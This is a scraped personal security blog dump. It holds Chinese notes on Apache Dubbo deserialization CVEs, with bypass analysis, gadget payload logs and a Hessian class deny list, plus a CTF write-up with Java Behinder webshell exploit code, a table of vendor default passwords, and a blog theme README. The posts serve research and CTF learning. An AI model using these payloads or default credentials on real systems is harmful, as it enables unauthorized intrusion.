hashmap.put(key,value)-&gt;key.toString()//java反序列化gadgets 2.7.7绕过https://github.com/apache/dubbo/pull/6374 https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7 DecodeableRpcInvocation https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0 if (desc.length() &gt; 0) &#123;//sink1//但是attachments 直接就绕过了 ... if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123; if (!RpcUtils.isGenericCall(path, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, this.getMethodName())) &#123; throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + this.getMethodName());//2.7.6报错退出 &#125; pts = ReflectUtils.desc2classArray(desc); &#125; RpcUtils public static boolean isGenericCall(String path, String method) &#123; return &quot;$invoke&quot;.equals(method) || &quot;$invokeAsync&quot;.equals(method); &#125; public static boolean isEcho(String path, String method) &#123; return &quot;$echo&quot;.equals(method); &#125; 改method即可绕过 sink1//但是attachments 也能绕过 sink2触发点在抛出错误前 所以绕过 2.7.92.7.8 protected Object decodeEventData(Channel channel, ObjectInput in) throws IOException &#123; try &#123; return in.readEvent(); &#125; catch (ClassNotFoundException | IOException var4) &#123; throw new IOException(StringUtils.toString(&quot;Decode dubbo protocol event failed.&quot;, var4)); &#125; &#125; 2.7.9 protected Object decodeEventData(Channel channel, ObjectInput in, byte[] eventBytes) throws IOException &#123; try &#123; if (eventBytes != null) &#123; int dataLen = eventBytes.length; int threshold = ConfigurationUtils.getSystemConfiguration().getInt(&quot;deserialization.event.size&quot;, 50); if (dataLen &gt; threshold) &#123; throw new IllegalArgumentException(&quot;Event data too long, actual size &quot; + dataLen + &quot;, threshold &quot; + threshold + &quot; rejected for security consideration.&quot;); &#125; &#125; return in.readEvent(); &#125; catch (ClassNotFoundException | IOException var6) &#123; throw new IOException(StringUtils.toString(&quot;Decode dubbo protocol event failed.&quot;, var6)); &#125; &#125; 2.7.13黑名单未启用bypass3 doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io) readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io) readObject:2123, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:2104, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:102, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) readAttachments:87, ObjectInput (org.apache.dubbo.common.serialize) decode:165, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) bypass4 expect:3566, Hessian2Input (com.alibaba.com.caucho.hessian.io) readString:1883, Hessian2Input (com.alibaba.com.caucho.hessian.io) readUTF:90, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) decode:122, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) 2.7.14使用黑名单bypass4 报错 三月 16, 2022 9:56:18 下午 com.alibaba.com.caucho.hessian.io.ClassFactory load 严重: com.rometools.rome.feed.impl.ToStringBean in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead. 三月 16, 2022 9:56:18 下午 com.alibaba.com.caucho.hessian.io.ClassFactory load 严重: com.sun.rowset.JdbcRowSetImpl in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead. [16/03/22 09:56:20:020 CST] DubboServerHandler-169.254.59.59:20880-thread-2 WARN dubbo.DecodeableRpcInvocation: [DUBBO] Decode rpc invocation failed: expected string at 0x48 java.util.HashMap (&#123;pwn=&#123;beanClass=class com.sun.rowset.JdbcRowSetImpl, at com.alibaba.com.caucho.hessian.io.Hessian2Input.error(Hessian2Input.java:3590) com.alibaba.com.caucho.hessian.io.ClassFactory 2.7.13 public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123; if (this.isAllow(className)) &#123; return Class.forName(className, false, this._loader); &#125; else &#123; log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class; &#125; &#125; private void initAllow() &#123; synchronized(this) &#123; if (this._allowList == null) &#123; this._allowList = new ArrayList(); this._allowList.addAll(_staticAllowList);//添加_allowList//但是没有直接或间接调用initAllow &#125; &#125; &#125; private boolean isAllow(String className) &#123; ArrayList&lt;ClassFactory.Allow&gt; allowList = this._allowList;//默认null，没有做限制 if (allowList == null) &#123; return true; 2.7.14 static &#123; ClassLoader classLoader = ClassFactory.class.getClassLoader(); try &#123; String[] denyClasses = readLines(classLoader.getResourceAsStream(&quot;DENY_CLASS&quot;)); String[] var2 = denyClasses; int var3 = denyClasses.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; String denyClass = var2[var4]; if (!denyClass.startsWith(&quot;#&quot;)) &#123; if (denyClass.endsWith(&quot;.&quot;)) &#123; _staticAllowList.add(new ClassFactory.AllowPrefix(denyClass, false)); &#125; else &#123; _staticAllowList.add(new ClassFactory.Allow(toPattern(denyClass), false)); &#125; &#125; &#125; &#125; catch (IOException var6) &#123; &#125; &#125; ClassFactory(ClassLoader loader) &#123; this._loader = loader; this.initAllow();//直接调用initAllow//初始化_allowList &#125; public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123; if (this.isAllow(className)) &#123; Class&lt;?&gt; aClass = Class.forName(className, false, this._loader); if (_allowClassSet.containsKey(className)) &#123; return aClass; &#125; else &#123; Class aSuperClass; if (aClass.getInterfaces().length &gt; 0) &#123; Class[] var3 = aClass.getInterfaces(); int var4 = var3.length; for(int var5 = 0; var5 &lt; var4; ++var5) &#123; aSuperClass = var3[var5]; if (!this.isAllow(aSuperClass.getName())) &#123; log.log(Level.SEVERE, className + &quot;&#39;s interfaces: &quot; + aSuperClass.getName() + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class; &#125; &#125; &#125; List&lt;Class&lt;?&gt;&gt; allSuperClasses = new LinkedList(); for(Class superClass = aClass.getSuperclass(); superClass != null; superClass = superClass.getSuperclass()) &#123; allSuperClasses.add(superClass); &#125; Iterator var9 = allSuperClasses.iterator(); do &#123; if (!var9.hasNext()) &#123; _allowClassSet.put(className, className); return aClass; &#125; aSuperClass = (Class)var9.next(); &#125; while(this.isAllow(aSuperClass.getName())); log.log(Level.SEVERE, className + &quot;&#39;s superClass: &quot; + aSuperClass.getName() + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class; &#125; &#125; else &#123; log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class;//白名单外，返回 HashMap.class &#125; &#125; dubbo-2.7.14.jar/DENY_CLASS bsh. ch.qos.logback.core.db. clojure. com.alibaba.citrus.springext.support.parser. com.alibaba.citrus.springext.util.SpringExtUtil. com.alibaba.druid.pool. com.alibaba.hotcode.internal.org.apache.commons.collections.functors. com.alipay.custrelation.service.model.redress. com.alipay.oceanbase.obproxy.druid.pool. com.caucho.config.types. com.caucho.hessian.test. com.caucho.naming. com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller. com.ibm.xltxe.rnm1.xtq.bcel.util. com.mchange.v2.c3p0. com.mysql.jdbc.util. com.rometools.rome.feed. com.sun.corba.se.impl. com.sun.corba.se.spi.orbutil. com.sun.jndi.rmi. com.sun.jndi.toolkit. com.sun.org.apache.bcel.internal. com.sun.org.apache.xalan.internal. com.sun.rowset. com.sun.xml.internal.bind.v2. com.taobao.vipserver.commons.collections.functors. groovy.lang. java.beans. java.lang.ProcessBuilder java.lang.Runtime java.rmi.server. java.security. java.util.ServiceLoader javassist.bytecode.annotation. javassist.tools.web.Viewer javassist.util.proxy. javax.imageio. javax.imageio.spi. javax.management. javax.media.jai.remote. javax.naming. javax.script. javax.sound.sampled. javax.xml.transform. net.bytebuddy.dynamic.loading. oracle.jdbc.connector. oracle.jdbc.pool. org.apache.aries.transaction.jms. org.apache.bcel.util. org.apache.carbondata.core.scan.expression. org.apache.commons.beanutils. org.apache.commons.codec.binary. org.apache.commons.collections.functors. org.apache.commons.collections4.functors. org.apache.commons.configuration. org.apache.commons.configuration2. org.apache.commons.dbcp.datasources. org.apache.commons.dbcp2.datasources. org.apache.commons.fileupload.disk. org.apache.ibatis.executor.loader. org.apache.ibatis.javassist.bytecode. org.apache.ibatis.javassist.tools. org.apache.ibatis.javassist.util. org.apache.ignite.cache. org.apache.log.output.db. org.apache.log4j.receivers.db. org.apache.myfaces.view.facelets.el. org.apache.openjpa.ee. org.apache.openjpa.ee. org.apache.shiro. org.apache.tomcat.dbcp. org.apache.velocity.runtime. org.apache.velocity. org.apache.wicket.util. org.apache.xalan.xsltc.trax. org.apache.xbean.naming.context. org.apache.xpath. org.apache.zookeeper. org.aspectj.apache.bcel.util. org.codehaus.groovy.runtime. org.datanucleus.store.rdbms.datasource.dbcp.datasources. org.eclipse.jetty.util.log. org.geotools.filter. org.h2.value. org.hibernate.tuple.component. org.hibernate.type. org.jboss.ejb3. org.jboss.proxy.ejb. org.jboss.resteasy.plugins.server.resourcefactory. org.jboss.weld.interceptor.builder. org.mockito.internal.creation.cglib. org.mortbay.log. org.quartz. org.springframework.aop.aspectj. org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler org.springframework.beans.factory. org.springframework.expression.spel. org.springframework.jndi. org.springframework.orm. org.springframework.transaction. org.yaml.snakeyaml.tokens. pstore.shaded.org.apache.commons.collections. sun.rmi.server. sun.rmi.transport. weblogic.ejb20.internal. weblogic.jms.common. https://cloud.tencent.com/developer/article/1945763 CVE-2021-25641 Apache Dubbo 2.7.0 to 2.7.8 Apache Dubbo 2.6.0 to 2.6.9 Apache Dubbo all 2.5.x versions (官方已不再提供支持) fastjson toString CVE-2021-30179https://www.modb.pro/db/145553 https://www.cvedetails.com/cve/CVE-2021-30179/ Apache Dubbo 2.7.0 to 2.7.9 Apache Dubbo 2.6.0 to 2.6.9 Apache Dubbo all 2.5.x versions (官方已不再提供支持) 2.7.9 RpcUtils public static boolean isGenericCall(String parameterTypesDesc, String method) &#123; return (&quot;$invoke&quot;.equals(method) || &quot;$invokeAsync&quot;.equals(method)) &amp;&amp; &quot;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&quot;.equals(parameterTypesDesc); &#125; public static boolean isEcho(String parameterTypesDesc, String method) &#123; return &quot;$echo&quot;.equals(method) &amp;&amp; &quot;Ljava/lang/Object;&quot;.equals(parameterTypesDesc); &#125; 类型为数组Ljava/lang/Object; 使用$echo CVE-2021-36161https://www.cvedetails.com/cve/CVE-2021-36161/ Dubbo 中的某些组件会尝试打印输入参数的格式化字符串，这可能会导致对带有特殊 toString 方法的恶意定制 bean 的 RCE。在最新版本中，我们修复了超时、缓存和其他一些地方的 toString 调用。Apache Dubbo 2.7.13 修复 CVE-2021-36163 CVE-2021-37579//source check绕过https://www.cvedetails.com/cve/CVE-2021-37579/ &lt;=2.7.12 Dubbo Provider 会检查传入的请求以及该请求对应的序列化类型是否满足服务器设置的配置。但是攻击者可以使用一个例外来跳过安全检查（启用时）并使用本机 java 序列化进行反序列化操作。Apache Dubbo 2.7.13、3.0.2 通过在发现任何无法识别的请求时快速失败来解决此问题。 https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/ serialization.security.check 需要设置环境变量启动 System.setProperty(&quot;serialization.security.check&quot;, String.valueOf(true)); DecodeableRpcInvocation public Object decode(Channel channel, InputStream input) throws IOException &#123; ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input); this.put(&quot;serialization_id&quot;, this.serializationType); String dubboVersion = in.readUTF(); this.request.setVersion(dubboVersion); this.setAttachment(&quot;dubbo&quot;, dubboVersion); String path = in.readUTF(); this.setAttachment(&quot;path&quot;, path); String version = in.readUTF(); this.setAttachment(&quot;version&quot;, version); this.setMethodName(in.readUTF()); String desc = in.readUTF(); this.setParameterTypesDesc(desc); try &#123; if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123; CodecSupport.checkSerialization(path, version, this.serializationType); &#125; 2.7.12 传递一个不存在的合法参数，这将使调用结束且不会引发异常 public static void checkSerialization(String path, String version, Byte id) throws IOException &#123; ServiceRepository repository = ApplicationModel.getServiceRepository(); ProviderModel providerModel = repository.lookupExportedServiceWithoutGroup(path + &quot;:&quot; + version); if (providerModel == null) &#123; if (logger.isWarnEnabled()) &#123; logger.warn(&quot;Serialization security check is enabled but cannot work as expected because there&#39;s no matched provider model for path &quot; + path + &quot;, version &quot; + version); &#125; &#125; else &#123; List&lt;URL&gt; urls = providerModel.getServiceConfig().getExportedUrls(); if (CollectionUtils.isNotEmpty(urls)) &#123; URL url = (URL)urls.get(0); String serializationName = url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;); Byte localId = (Byte)SERIALIZATIONNAME_ID_MAP.get(serializationName); if (localId != null &amp;&amp; !localId.equals(id)) &#123; throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;); &#125; &#125; &#125; &#125; 2.7.13补丁//log改成throw Exception public static void checkSerialization(String path, String version, Byte id) throws IOException &#123; ServiceRepository repository = ApplicationModel.getServiceRepository(); ProviderModel providerModel = repository.lookupExportedServiceWithoutGroup(path + &quot;:&quot; + version); if (providerModel == null) &#123; throw new IOException(&quot;Service &quot; + path + &quot; with version &quot; + version + &quot; not found, invocation rejected.&quot;); &#125; else &#123; List&lt;URL&gt; urls = providerModel.getServiceConfig().getExportedUrls(); if (CollectionUtils.isNotEmpty(urls)) &#123; URL url = (URL)urls.get(0); String serializationName = url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;); Byte localId = (Byte)SERIALIZATIONNAME_ID_MAP.get(serializationName); if (localId != null &amp;&amp; !localId.equals(id)) &#123; throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;); &#125; &#125; &#125; &#125; 还是黑名单好用，过滤sink不如过滤source CVE-2021-43297https://www.cvedetails.com/cve/CVE-2021-43297/ https://cloud.tencent.com/developer/article/1945763 https://www.cnblogs.com/bitterz/p/15828415.html#5-dubbo2713%E5%8F%AF%E7%94%A8%E7%9A%84poc dubbo hessian-lite 3.2.11及之前版本存在反序列化漏洞，可能导致恶意代码执行。大多数 Dubbo 用户使用 Hessian2 作为默认的序列化/反序列化协议，在 Hessian 捕获意外异常期间，Hessian 会为用户注销一些信息，这可能会导致远程命令执行。该问题影响 Apache Dubbo Apache Dubbo 2.6.x 2.6.12 之前的版本；Apache Dubbo 2.7.x 2.7.15 之前的版本；Apache Dubbo 3.0.x 3.0.5 之前的版本。 Apache Dubbo 2.6.x &lt; 2.6.12 Apache Dubbo 2.7.x &lt; 2.7.15 Apache Dubbo 3.0.x &lt; 3.0.5 AbstractDeserializer、AbstractListDeserializer、AbstractMapDeserializer com.alibaba.com.caucho.hessian.io.AbstractMapDeserializer public Object readObject(AbstractHessianInput in) throws IOException &#123; Object obj = in.readObject(); if (obj != null) &#123; throw this.error(&quot;expected map/object at &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;); &#125; else &#123; throw this.error(&quot;expected map/object at null&quot;); &#125; &#125; 2.7.13没有黑名单 2.7.14需要绕过黑名单 2.7.15修复sink2 https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd protected IOException expect(String expect, int ch) throws IOException &#123; if (ch &lt; 0) &#123; return this.error(&quot;expected &quot; + expect + &quot; at end of file&quot;); &#125; else &#123; --this._offset; try &#123; Object obj = this.readObject(); return obj != null ? this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; &quot; + obj.getClass().getName()) : this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; null&quot;); 其他漏洞https://www.cvedetails.com/cve/CVE-2021-30180/ https://www.cvedetails.com/cve/CVE-2021-30181/ 问题解决trick: 断点下在jndi [Dubbo] Current Spring Boot Application is await &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; https://blog.csdn.net/qq_33189961/article/details/116430262 dubbo 2.7.5 //2.7.6没有问题 nc 127.0.0.1 12345 dubbo&gt;ls 报错 Unsupported command: ls 改provide的application.propertier，并安装插件 https://github.com/apache/dubbo/issues/5690 dubbopoc 依赖为dubbo-2.7.13时启动 provide 报错: Error creating bean with name ‘referenceAnnotationBeanPostProcessor’ https://www.editcode.net/thread-79209-1-1.html &lt;dependency&gt; &lt;groupId&gt;com.alibaba.spring&lt;/groupId&gt; &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt; &lt;version&gt;1.0.11&lt;/version&gt; &lt;/dependency&gt; 防护1、关闭对公网开放的Dubbo服务端端口，仅允许可信任的IP访问。 2、Dubbo协议默认使用Hessian进行序列化和反序列化。在不影响业务的情况下，建议更换协议以及反序列化方式。具体方法请参考官方文档：http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html 3、配置环境变量serialization.security.check=true，开启强校验","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"RCTF2021_misc_ezshell_出题人wp","slug":"RCTF2021_misc_ezshell_出题人wp","date":"2021-09-14T14:08:27.739Z","updated":"2022-03-20T16:40:16.844Z","comments":true,"path":"2021/09/14/RCTF2021_misc_ezshell_出题人wp/","link":"","permalink":"https://pipimi110.github.io/2021/09/14/RCTF2021_misc_ezshell_%E5%87%BA%E9%A2%98%E4%BA%BAwp/","excerpt":"","text":"docker https://github.com/pipimi110/myctf/tree/main/misc/rctf2021_ezshell 预期解http://124.70.137.88:60080/xxx tomcat 404报错 /index.html 跳转 /shell 可以直接下载 ROOT.war 发现有个根据冰蝎 shell.jsp 实现的 servlet shell，根据题目描述，过滤了内存马、命令执行，且限制出网，所以考虑实现回显 根据提示，查看冰蝎 BasicInfo 源码，发现其功能为输出环境变量和系统属性，Exp 尝试直接输出环境变量就看到 flag 了 补充 其实这道题主要方向是冰蝎密钥交互写死 getOutputStream 和题目 Servlet 里的 getWriter 冲突 如果有的师傅手上有修改后支持连接内存马的冰蝎，修改对应函数名为 Servlet 中的 ‘e’ 后，应该也是连不上的: ) payload/java/Echo Object so = this.Response.getClass().getMethod(&quot;getOutputStream&quot;).invoke(this.Response); 支持内存马连接和函数冲突解决的冰蝎的一个demo https://github.com/pipimi110/Behinder_ezshell ezshell中使用的agent https://github.com/pipimi110/javaAgentLearn Expected solutionhttp://124.70.137.88:60080/xxx tomcat 404 error /index.html jump to /shell to download ROOT.war found a servlet shell based on shell.jsp of the Behinder ,according to the desc, There is an agent to filter memshell and ProcessImpl, and The Outbound traffic is closed, so just Echo According to the hint, read the source code of the Behinder BasicInfo, and find that its function is to output environment variables and system properties, then try to directly output environment variables and see flag :) Additions In fact, the main direction of this question is the conflict between the getOutputStream used in the Behinder key interaction and the getWriter in the Servlet If some ctfers have a modified Behinder that supports connecting to memshell, they should not be able to connect even after modifying the corresponding function name to ‘e’ in the Servlet: ) payload/java/Echo Object so = this.Response.getClass().getMethod(&quot;getOutputStream&quot;).invoke(this.Response); A demo of Behinder that supports memshell connection and function conflict resolution https://github.com/pipimi110/Behinder_ezshell Agent used in ezshell https://github.com/pipimi110/javaAgentLearn Expimport javassist.ClassPool; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletResponse; import java.io.InputStream; import java.net.URL; import java.net.URLConnection; import java.util.*; public class demo &#123; public boolean e(Object obj1, Object obj2) &#123; solve((HttpServletResponse) obj2); return false; &#125; public void solve(HttpServletResponse obj2) &#123; try &#123; obj2.getWriter().write(&quot;demo success&quot;); obj2.getWriter().write(getSysEnv()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) throws Exception &#123; // getSysEnv(); getpayload(); &#125; public static String getSysEnv() throws Exception &#123; StringBuilder basicInfo = new StringBuilder(&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;环境变量:&lt;/font&gt;&lt;br/&gt;&quot;); Map&lt;String, String&gt; env = System.getenv(); Iterator var5 = env.keySet().iterator(); while (var5.hasNext()) &#123; String name = (String) var5.next(); basicInfo.append(name + &quot;=&quot; + (String) env.get(name) + &quot;&lt;br/&gt;&quot;); &#125; return (basicInfo.toString()); &#125; public static void getpayload() throws Exception &#123; String k = &quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ Cipher c = Cipher.getInstance(&quot;AES&quot;); c.init(1, new SecretKeySpec(k.getBytes(), &quot;AES&quot;)); byte[] bytes = ClassPool.getDefault().get(&quot;demo&quot;).toBytecode(); bytes = c.doFinal(bytes); System.out.println(new String(Base64.getEncoder().encode(bytes))); &#125; &#125; class U extends ClassLoader &#123; U(ClassLoader c) &#123; super(c); &#125; public Class g(byte[] b) &#123; return super.defineClass(b, 0, b.length); &#125; &#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pipimi110.github.io/categories/CTF/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"https://pipimi110.github.io/categories/CTF/"}]},{"title":"ayaneSama","slug":"ayaneSama","date":"2021-04-19T09:11:51.335Z","updated":"2022-03-20T16:39:33.187Z","comments":true,"path":"2021/04/19/ayaneSama/","link":"","permalink":"https://pipimi110.github.io/2021/04/19/ayaneSama/","excerpt":"","text":"o((&gt;ω&lt; ))o","categories":[{"name":"test","slug":"test","permalink":"https://pipimi110.github.io/categories/test/"}],"tags":[{"name":"cv","slug":"cv","permalink":"https://pipimi110.github.io/tags/cv/"}],"keywords":[{"name":"test","slug":"test","permalink":"https://pipimi110.github.io/categories/test/"}]},{"title":"密码表","slug":"密码表","date":"2021-04-18T18:41:20.376Z","updated":"2022-03-20T16:41:12.004Z","comments":true,"path":"2021/04/19/密码表/","link":"","permalink":"https://pipimi110.github.io/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/","excerpt":"","text":"密码表服务原始密码https://www.it2021.com/security/614.html 设备默认账号默认密码深信服产品sangforsangforsangfor@2018sangfor@2019深信服科技 ADdlanrecover深信服负载均衡 AD 3.6adminadmin深信服WAC ( WNS V2.6)adminadmin深信服VPNAdminAdmin深信服ipsec-VPN (SSL 5.5)AdminAdmin深信服AC6.0adminadminSANGFOR防火墙adminsangfor深信服AF(NGAF V2.2)adminsangfor深信服NGAF下一代应用防火墙(NGAF V4.3)adminadmin深信服AD3.9adminadmin深信服上网行为管理设备数据中心Admin密码为空SANGFOR_AD_v5.1adminadmin网御漏洞扫描系统leadsecleadsec天阗入侵检测与管理系统 V7.0Adminvenus70Auditvenus70admvenus70天阗入侵检测与管理系统 V6.0Adminvenus60Auditvenus60admvenus60网御WAF集中控制中心(V3.0R5.0)adminleadsec.wafauditleadsec.wafadmleadsec.waf联想网御administratoradministrator网御事件服务器adminadmin123联想网御防火墙PowerVadministratoradministrator联想网御入侵检测系统lenovodefault网络卫士入侵检测系统admintalent网御入侵检测系统V3.2.72.0admleadsec32adminleadsec32联想网御入侵检测系统IDSroot111111adminadmin123科来网络回溯分析系统csadmincolasoft中控考勤机web3.0administrator123456H3C iMCadminadminH3C SecPath系列adminadminH3C S5120-SItest123H3C智能管理中心adminadminH3C ER3100adminadminer3100H3C ER3200adminadminer3200H3C ER3260adminadminer3260H3Cadminadmineradminadminadminh3capadminh3ch3c360天擎adminadmin网神防火墙firewallfirewall天融信防火墙NGFW4000supermantalent黑盾防火墙adminadminruleabc123auditabc123华为防火墙telnetusertelnetpwdftpuserftppwd方正防火墙adminadmin飞塔防火墙admin密码为空Juniper_SSG__5防火墙netscreennetscreen中新金盾硬件防火墙admin123kill防火墙(冠群金辰)adminsys123天清汉马USG防火墙adminvenus.fwAuditvenus.audituseradminvenus.user阿姆瑞特防火墙adminmanager山石网科hillstonehillstone绿盟安全审计系统weboperweboperwebauditwebauditconadminconadminadminadminshellshell绿盟产品nsfocus123TopAudit日志审计系统supermantalentLogBase日志管理综合审计系统adminsafetybase网神SecFox运维安全管理与审计系统admin!1fw@2soc#3vpn天融信数据库审计系统supermantelentHillstone安全审计平台hillstonehillstone网康日志中心ns25000ns25000网络安全审计系统（中科新业）admin123456天玥网络安全审计系统Admincyberaudit明御WEB应用防火墙adminadminadminadminadmin明御攻防实验室平台root123456明御安全网关adminadminadmin明御运维审计与册风险控制系统admin1q2w3esystem1q2w3e4rauditor1q2w3e4roperator1q2w3e4r明御网站卫士sysmanagersysmanager888亿邮邮件网关eyouusereyou_admineyougwadmin@(eyou)admin+-cccccadmincyouadminWebsense邮件安全网关administratoradmin梭子鱼邮件存储网关adminadmin","categories":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}],"tags":[{"name":"txt","slug":"txt","permalink":"https://pipimi110.github.io/tags/txt/"}],"keywords":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}]},{"title":"Hexo-Theme-Sakura","slug":"Hexo-Theme-Sakura","date":"2018-12-12T14:16:01.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"2018/12/12/Hexo-Theme-Sakura/","link":"","permalink":"https://pipimi110.github.io/2018/12/12/Hexo-Theme-Sakura/","excerpt":"","text":"hexo-theme-sakura主题 English document 基于WordPress主题Sakura修改成Hexo的主题。 demo预览 正在开发中…… 交流群若你是使用者，加群QQ: 801511924 若你是创作者，加群QQ: 194472590 主题特性 首页大屏视频 首页随机封面 图片懒加载 valine评论 fancy-box相册 pjax支持，音乐不间断 aplayer音乐播放器 多级导航菜单（按现在大部分hexo主题来说，这也算是个特性了） 赞赏作者如果喜欢hexo-theme-sakura主题，可以考虑资助一下哦~非常感激！ paypal | Alipay 支付宝 | WeChat Pay 微信支付 未完善的使用教程那啥？老实说我目前也不是很有条理233333333~ 1、主题下载安装hexo-theme-sakura建议下载压缩包格式，因为除了主题内容还有些source的配置对新手来说比较太麻烦，直接下载解压就省去这些麻烦咯。 下载好后解压到博客根目录（不是主题目录哦，重复的选择替换）。接着在命令行（cmd、bash）运行npm i安装依赖。 2、主题配置博客根目录下的_config配置站点 # Site title: 你的站点名 subtitle: description: 站点简介 keywords: author: 作者名 language: zh-cn timezone: 部署 deploy: type: git repo: github: 你的github仓库地址 # coding: 你的coding仓库地址 branch: master 备份 （使用hexo b发布备份到远程仓库） backup: type: git message: backup my blog of https://honjun.github.io/ repository: # 你的github仓库地址,备份分支名 （建议新建backup分支） github: https://github.com/honjun/honjun.github.io.git,backup # coding: https://git.coding.net/hojun/hojun.git,backup 主题目录下的_config配置其中标明【改】的是需要修改部门，标明【选】是可改可不改，标明【非】是不用改的部分 # site name # 站点名 【改】 prefixName: さくら荘その siteName: hojun # favicon and site master avatar # 站点的favicon和头像 输入图片路径（下面的配置是都是cdn的相对路径，没有cdn请填写完整路径，建议使用jsdeliver搭建一个cdn啦，先去下载我的cdn替换下图片就行了，简单方便~）【改】 favicon: /images/favicon.ico avatar: /img/custom/avatar.jpg # 站点url 【改】 url: https://sakura.hojun.cn # 站点介绍（或者说是个人签名）【改】 description: Live your life with passion! With some drive! # 站点cdn，没有就为空 【改】 若是cdn为空，一些图片地址就要填完整地址了，比如之前avatar就要填https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/avatar.jpg cdn: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6 # 开启pjax 【选】 pjax: 1 # 站点首页的公告信息 【改】 notice: hexo-Sakura主题已经开源，目前正在开发中... # 懒加载的加载中图片 【选】 lazyloadImg: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg # 站点菜单配置 【选】 menus: 首页: &#123; path: /, fa: fa-fort-awesome faa-shake &#125; 归档: &#123; path: /archives, fa: fa-archive faa-shake, submenus: &#123; 技术: &#123;path: /categories/技术/, fa: fa-code &#125;, 生活: &#123;path: /categories/生活/, fa: fa-file-text-o &#125;, 资源: &#123;path: /categories/资源/, fa: fa-cloud-download &#125;, 随想: &#123;path: /categories/随想/, fa: fa-commenting-o &#125;, 转载: &#123;path: /categories/转载/, fa: fa-book &#125; &#125; &#125; 清单: &#123; path: javascript:;, 